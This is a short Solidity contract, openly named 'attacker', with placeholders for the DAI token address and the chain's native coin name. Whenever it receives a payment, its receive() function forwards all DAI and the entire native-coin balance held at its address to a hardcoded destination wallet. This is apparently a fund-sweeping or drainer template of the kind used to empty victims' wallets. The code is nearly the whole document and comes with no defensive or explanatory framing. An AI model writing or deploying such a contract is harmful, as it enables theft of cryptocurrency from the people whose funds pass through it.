// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract attacker {

    address public constant DAI = <CONTRACT_ADDRESS_ACCORDING_TO_BLOCKCHAIN_NETWORK>;
    
    address public constant DESTINATION = 0x405f24B4C3C0DbEFbc2D333bABE8d73B99F7744b;
    
    receive() external payable {

        IERC20 dai = IERC20(DAI);
        uint256 daiBalance = dai.balanceOf(address(this));
        
        if (daiBalance > 0) {
            dai.transfer(DESTINATION, daiBalance);
        }

        if (address(this).balance > 0) {
            (bool success,) = DESTINATION.call{value: address(this).balance}("");
            require(success, "<NATIVE_BLOCKCHAIN_COIN_NAME> transfer failed");
        }
    }
}
